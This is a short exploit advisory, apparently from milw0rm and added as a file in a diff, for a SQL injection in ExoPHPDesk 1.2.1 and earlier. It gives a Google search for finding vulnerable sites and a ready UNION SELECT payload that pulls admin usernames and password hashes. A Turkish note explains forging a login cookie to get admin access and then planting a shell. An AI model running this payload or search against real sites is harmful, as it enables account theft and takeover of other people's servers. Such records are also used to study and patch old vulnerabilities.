@@ -1,0 +1,35 @@
+*******************************************************************************
+# Title   :  ExoPHPDesk <= 1.2.1 (faq.php) Remote SQL Injection Vulnerability
+# Author  :  ajann
+# Contact :  :(
+# S.Page  :  http://www.exoscripts.com
+# $$      :  Free
+# Dork    :  Powered by ExoPHPDesk v1.2 Final.
+# DorkEx  :  http://www.google.com.tr/search?q=Powered+by+ExoPHPDesk+v1.2+Final.+&hl=tr&start=0&sa=N
+
+# Info    : \* Google aramasi sonucu admin kullanici adini ve hashlarini ele
+           gecirdiginizde md5 ile sifrelenmis hashi kirmamiza gerek yok.
+           Siteye uye olarak beni hatirla tarzi cookie ile girisimizi yaparak,
+           cookilerde tutulan UserName ve Pass'i degistererek , admin yetkisi
+           ile giris yapabilirsiniz.Daha sonra ticket bolumunden eger serverda
+           ayarlar tamsa(configdeki) shell sokabilirsiniz. /*
+
+*******************************************************************************
+
+[[SQL]]]---------------------------------------------------------
+
+http://[target]/[path]//faq.php?action=&type=view&s=&id=[SQL]
+
+Example:
+
+//faq.php?action=&type=view&s=&id=-1'%20union%20select%200,concat(char(85),char(115),char(101),char(114),char(110),char(97),char(109),char(101),char(58),name,char(32),char(124),char(124),char(32),char(80),char(97),char(115),char(115),char(119),char(111),char(114),char(100),char(58),pass),0,0,0,0,0%20from%20phpdesk_admin/*
+
+[[/SQL]]
+
+"""""""""""""""""""""
+# ajann,Turkey
+# ...
+
+# Im not Hacker!
+
+# milw0rm.com [2007-01-31]
